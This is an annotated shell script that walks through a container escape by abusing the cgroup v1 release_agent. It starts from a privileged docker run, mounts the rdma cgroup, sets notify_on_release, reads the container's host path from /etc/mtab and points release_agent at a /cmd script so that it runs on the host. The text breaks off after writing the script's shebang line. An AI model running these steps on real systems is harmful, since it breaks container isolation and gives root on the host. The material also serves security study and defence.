# Goal: Trigger the release_agent, by killing all processes in a cgroup
# Run on Host:
# docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# First we mount a cgroup contoller to a new folder '/mnt/cgrp' and create a child cgroup
# We mount the rdma controller and create a child cgroup by creating the subfolder '/tmp/cgrp/x'
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# We enable cgroup notification on release for the x cgroup.
# This is done, by writing a 1 to the notify_on_release file of x.
echo 1 > /tmp/cgrp/x/notify_on_release

# We grab the containers path on the host from the '/etc/mtab' file (upperdir=) and store it in host_path.
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# We tell the RDMA cgroup release agent to execute the '/cmd' script.
# This is done by writing the path to the script file to the release_agent file.
# The agent is executed on the host, so we need to add the host_path of the container.
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# We create our sriptfile ('/cmd') and make it executable.
echo '#!/bin/sh' > /cmd
